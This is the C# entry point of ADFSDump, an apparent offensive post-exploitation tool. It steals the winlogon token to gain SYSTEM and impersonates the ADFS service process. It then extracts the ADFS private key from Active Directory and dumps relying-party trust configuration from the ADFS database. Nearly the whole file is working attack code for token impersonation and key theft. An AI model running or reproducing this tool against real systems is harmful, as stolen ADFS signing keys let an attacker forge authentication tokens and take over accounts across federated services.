using System;
using ADFSDump.ReadDB;
using System.Collections.Generic;
using ADFSDump.RelyingPartyTrust;
using ADFSDump.About;
using ADFSDump.ActiveDirectory;

using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security;
using System.Security.Principal;


namespace ADFSDump
{
    
    class Program
    {
        
         [DllImport("advapi32", SetLastError = true), SuppressUnmanagedCodeSecurityAttribute]
            static extern int OpenProcessToken(
          System.IntPtr ProcessHandle, // handle to process
          int DesiredAccess, // desired access to process
          ref IntPtr TokenHandle // handle to open access token
        );

        [DllImport("kernel32", SetLastError = true), SuppressUnmanagedCodeSecurityAttribute]
        static extern bool CloseHandle(IntPtr handle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);

        public const int TOKEN_DUPLICATE = 2;
        public const int TOKEN_QUERY = 0X00000008;
        public const int TOKEN_IMPERSONATE = 0X00000004;

        static void Impersonate_Process(string process_name)
        {
            IntPtr hToken = IntPtr.Zero;
            IntPtr dupeTokenHandle = IntPtr.Zero;

            Process proc = Process.GetProcessesByName(process_name)[0];
            if (OpenProcessToken(proc.Handle, TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, ref hToken) != 0)
            {
                WindowsIdentity newId = new WindowsIdentity(hToken);
                Console.WriteLine(newId.Owner);
                try
                {
                    const int SecurityImpersonation = 2;
                    dupeTokenHandle = DupeToken(hToken, SecurityImpersonation);
                    if (IntPtr.Zero == dupeTokenHandle)
                    {
                        string s = String.Format("Dup failed {0}, privilege not held",
                        Marshal.GetLastWin32Error());
                        throw new Exception(s);
                    }

                    WindowsImpersonationContext impersonatedUser = newId.Impersonate();
                    IntPtr accountToken = WindowsIdentity.GetCurrent().Token;
                    Console.WriteLine("Token number is: " + accountToken.ToString());
                    Console.WriteLine("Windows ID Name is: " + WindowsIdentity.GetCurrent().Name);
                }
                finally
                {
                    CloseHandle(hToken);
                }
            }
            else
            {
                string s = String.Format("OpenProcess Failed {0}, privilege not held", Marshal.GetLastWin32Error());
                throw new Exception(s);
            }
        }

        static IntPtr DupeToken(IntPtr token, int Level)
        {
            IntPtr dupeTokenHandle = IntPtr.Zero;
            bool retVal = DuplicateToken(token, Level, ref dupeTokenHandle);
            return dupeTokenHandle;
        }

        private static Dictionary<string, string> ParseArgs(string[] args)
        {
            Dictionary<string, string> arguments = new Dictionary<string, string>();
            try
            {
                foreach(string argument in args)
                {                 
                    var index = argument.IndexOf(":", StringComparison.Ordinal);
                    if (index > 0)
                    {
                        arguments[argument.Substring(0, index)] = argument.Substring(index + 1);
                    }
                    else
                    {
                        arguments[argument] = "";
                    }
                }
            } catch (Exception e)
            {
               Info.ShowHelp();
               Environment.Exit(1);
            }
            return arguments;
        }

        static void Main(string[] args)
        {
            Impersonate_Process("winlogon"); // get system in order to impersonate the adsync user.
            Impersonate_Process("Microsoft.IdentityServer.ServiceHost");

            Info.ShowInfo();
            Dictionary<string, string> arguments = new Dictionary<string, string>();
            if (args.Length > 0) arguments = ParseArgs(args);

            if (!arguments.ContainsKey("/nokey"))
            {
                ADSearcher.GetPrivKey(arguments);
            }
            
            Dictionary<string, RelyingParty>.ValueCollection rps = DatabaseReader.ReadConfigurationDb(arguments);
            
            if (rps == null)
            {
                Environment.Exit(1);
            }
            foreach(var relyingparty in rps)
            {
                Console.WriteLine($"[-] {relyingparty}");
            }

        }
    }
}
